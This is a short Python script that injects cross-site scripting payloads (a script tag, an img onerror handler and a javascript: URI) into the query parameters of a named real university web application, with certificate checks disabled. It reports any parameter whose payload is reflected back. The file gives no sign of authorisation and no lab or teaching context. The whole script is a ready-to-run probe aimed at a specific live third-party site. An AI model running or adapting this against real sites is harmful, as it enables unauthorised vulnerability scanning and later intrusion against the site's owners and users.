import requests

# Define the target URL
url = "https://traduction.univ-alger2.dz/apps/index.php"

# Define payloads to test for XSS
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')"
]

# Define the parameters to test
params = {
    "statut": "4",
    "etudiant": "1",
    "action": "80",
    "valeur": "1658"
}

# Function to test for XSS with SSL verification disabled
def test_xss(url, params, payloads):
    print("Testing for XSS vulnerabilities...")
    for key in params.keys():
        for payload in payloads:
            # Inject the payload into the current parameter
            params[key] = payload
            try:
                response = requests.get(url, params=params, timeout=10, verify=False)  # Disable SSL verification
                if response.status_code == 200:
                    # Check if the payload is reflected in the response
                    if payload in response.text:
                        print(f"[!] Potential XSS vulnerability detected with payload: {payload}")
                        print(f"   Affected parameter: {key}")
                        print(f"   Response: {response.text[:200]}...")  # Show partial response
                else:
                    print(f"[-] Unexpected status code: {response.status_code} with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"[-] Error sending request with payload: {payload}. Error: {e}")

# Run the test
test_xss(url, params, payloads)